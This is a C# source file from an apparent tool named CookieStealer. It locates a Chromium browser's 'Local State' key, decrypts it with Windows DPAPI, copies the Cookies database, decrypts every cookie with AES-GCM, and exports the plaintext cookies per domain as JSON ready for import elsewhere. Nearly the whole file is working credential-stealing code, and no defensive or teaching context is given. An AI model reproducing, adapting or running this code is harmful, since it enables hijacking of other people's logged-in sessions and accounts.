namespace CookieStealer.Cookies;

using System;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using Microsoft.Data.Sqlite;


public class Extractor
{
    class LocalStateDto
    {
        [JsonPropertyName("os_crypt")]
        public OsCrypt OsCrypt { get; set; }
    }

    class OsCrypt
    {
        [JsonPropertyName("encrypted_key")]
        public string EncryptedKey { get; set; }
    }

    private const string CookiesFileName = @"Default\Network\Cookies";
    private const string LocalStateFileName = "Local State";
    private const string DecryptedCookiesFileName =  @"raw\Cookies_Decrypted";

    public Extractor()
    {
        if (!Directory.Exists("cookies"))
        {
            Directory.CreateDirectory("cookies");
        }
        
        if (!Directory.Exists("raw"))
        {
            Directory.CreateDirectory("raw");
        }
        
        
    }

    public static IEnumerable<Cookie> GetCookies(string baseFolder)
    {
        var key = GetKey(baseFolder);
        var cookies = ReadFromDb(baseFolder, key);
        return cookies;
    }
    
    private static byte[] GetKey(string baseFolder)
    {
        var file = Path.Combine(baseFolder, LocalStateFileName);
        var localStateContent = File.ReadAllText(file);
        var localState = JsonSerializer.Deserialize<LocalStateDto>(localStateContent);
        var encryptedKey = localState?.OsCrypt?.EncryptedKey;

        var keyWithPrefix = Convert.FromBase64String(encryptedKey);
        var key = keyWithPrefix[5..];
        var masterKey = ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
        return masterKey;
    }
    
    private static IEnumerable<Cookie> ReadFromDb(string baseFolder, byte[] key)
    {
        ICollection<Cookie> result = new List<Cookie>();
        
        var dbFileName = Path.Combine(baseFolder, CookiesFileName);
        
        File.Copy(dbFileName, DecryptedCookiesFileName, true);

        using var connection = new SqliteConnection($"Data Source={DecryptedCookiesFileName}");
    
        connection.Open();

        var expireTime = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        var command = connection.CreateCommand();
        command.CommandText =
            """
            select     *
            from cookies
            WHERE has_expires = 0 or (has_expires = 1 and expires_utc > $expireTime)
                                
            """;
        command.Parameters.AddWithValue("$expireTime", expireTime);
        
        var countCommand = connection.CreateCommand();
        countCommand.CommandText =
            """
            select     COUNT(*)
            from cookies
            WHERE has_expires = 0 or (has_expires = 1 and expires_utc > $expireTime)
            """;
        countCommand.Parameters.AddWithValue("$expireTime", expireTime);
        var totalRows = Convert.ToInt32(countCommand.ExecuteScalar());
        
        
        Console.Write("Decrypting cookies... ");
        using (var progress = new ProgressBar())
        {

            using var reader = command.ExecuteReader();

            while (reader.Read())
            {
                var name = reader["name"].ToString();
                if (string.IsNullOrEmpty(name))
                {
                    continue;
                }

                var path = reader["path"].ToString();
                var domain = reader["host_key"].ToString();
                var encrypted_value = (byte[])reader["encrypted_value"];
                var creation_utc = reader["creation_utc"].ToString();

                var value = DecryptCookie(key, encrypted_value);

                var cookie = new Cookie(name, value, path, domain);
                result.Add(cookie);

                using var updateCommand = connection.CreateCommand();
                updateCommand.CommandText =
                    """
                    UPDATE cookies
                    SET value = $value
                    WHERE creation_utc = $creation_utc
                    """;
                updateCommand.Parameters.AddWithValue("$value", value);
                updateCommand.Parameters.AddWithValue("$creation_utc", creation_utc);
                updateCommand.ExecuteNonQuery();
                
                progress.Report((double)result.Count / totalRows);
            }
        }
        Console.WriteLine("Done.");
        return result;
    }

    private static string DecryptCookie(byte[] masterKey, byte[] cookie)
    {
        var nonce = cookie[3..15];
        var ciphertext = cookie[15..^16];
        var tag = cookie[^16..(cookie.Length)];

        var resultBytes = new byte[ciphertext.Length];
        
        using var aesGcm = new AesGcm(masterKey);
        aesGcm.Decrypt(nonce, ciphertext, tag, resultBytes);
        var cookieValue = Encoding.UTF8.GetString(resultBytes);
        return cookieValue;
    }
    
    
    
    public static void ExtractCookies(string cookiesPath)
    {
        using var connection = new SqliteConnection($"Data Source={cookiesPath}");
        connection.Open();

        var command = connection.CreateCommand();
        command.CommandText =
            """
            SELECT host_key as domain,
                   expires_utc as expirationDate,
                   host_key as hostOnly,
                   is_httponly as httpOnly,
                   name,
                   path,
                   samesite as sameSite,
                   is_secure as secure,
                   is_persistent as session,
                   null as storeID,
                   value
            FROM cookies
            """;


        var cookies = new Dictionary<string, List<dynamic>>();
        using var reader = command.ExecuteReader();
        while (reader.Read())
        {
            var cookie = new
            {
                domain = reader["domain"].ToString(),
                expirationDate =
                    Translator.ConvertExpiresUtcToExpirationDate(Convert.ToDecimal(reader["expirationDate"])),
                hostOnly = Translator.HostOnly(reader["hostOnly"].ToString()),
                httpOnly = Convert.ToBoolean(reader["httpOnly"]),
                name = reader["name"].ToString(),
                path = reader["path"].ToString(),
                sameSite = Translator.SameSite(Convert.ToInt16(reader["sameSite"])),
                secure = Convert.ToBoolean(reader["secure"]),
                session = Convert.ToBoolean(reader["session"]),
                storeID = reader["storeID"],
                value = reader["value"].ToString()
            };

            var domain = Translator.FileName(cookie.domain);
            if (!cookies.ContainsKey(domain))
            {
                cookies[domain] = new List<dynamic>();
            }

            cookies[domain].Add(cookie);
        }

        foreach (var domain in cookies.Keys)
        {
            var json = Newtonsoft.Json.JsonConvert.SerializeObject(cookies[domain],
                Newtonsoft.Json.Formatting.Indented);
            var path = @$"cookies\{domain}.json";
            File.WriteAllText(path, json);
        }
    }
}